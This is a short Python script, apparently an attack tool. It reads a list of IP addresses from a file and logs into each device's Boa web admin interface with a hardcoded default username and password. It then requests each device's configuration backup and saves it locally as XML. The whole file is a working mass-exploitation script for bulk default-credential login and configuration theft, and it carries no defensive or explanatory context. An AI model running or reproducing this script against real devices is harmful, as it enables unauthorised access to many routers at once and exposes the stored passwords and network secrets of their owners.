import requests
import os


def send_login_request(ip):
    url = f"http://{ip}/boaform/webLogin"
    headers = {
        'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0',
        'Accept': '*/*',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'X-Requested-With': 'XMLHttpRequest',
        'Origin': f"http://{ip}",
        'Connection': 'keep-alive',
        'Referer': f"http://{ip}/login.asp"
    }
    data = {
        'username': 'super',
        'password': 'kingT#92Su'
    }

    response = requests.post(url, headers=headers, data=data)
    if response.status_code == 200:
        print(f"Login request sent successfully to {ip}")
    else:
        print(f"Failed to send login request to {ip}")


def send_download_request(ip):
    url = f"http://{ip}/boaform/settingConfig"
    headers = {
        'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Origin': f"http://{ip}",
        'Connection': 'keep-alive',
        'Referer': f"http://{ip}/page/config.asp?0",
        'Upgrade-Insecure-Requests': '1'
    }
    data = {
        'config_backup': 'Backup'
    }

    response = requests.post(url, headers=headers, data=data)
    if response.status_code == 200:
        filename = f"{ip}.xml"
        folder_path = "boa_xml"
        os.makedirs(folder_path, exist_ok=True)
        file_path = os.path.join(folder_path, filename)
        with open(file_path, "wb") as file:
            file.write(response.content)
        print(f"Downloaded file saved: {file_path}")
    else:
        print(f"Failed to send download request to {ip}")


def main():
    with open("boa_alive.txt", "r") as file:
        ip_list = file.read().splitlines()

    for ip in ip_list:
        send_login_request(ip)
        send_download_request(ip)


if __name__ == "__main__":
    main()
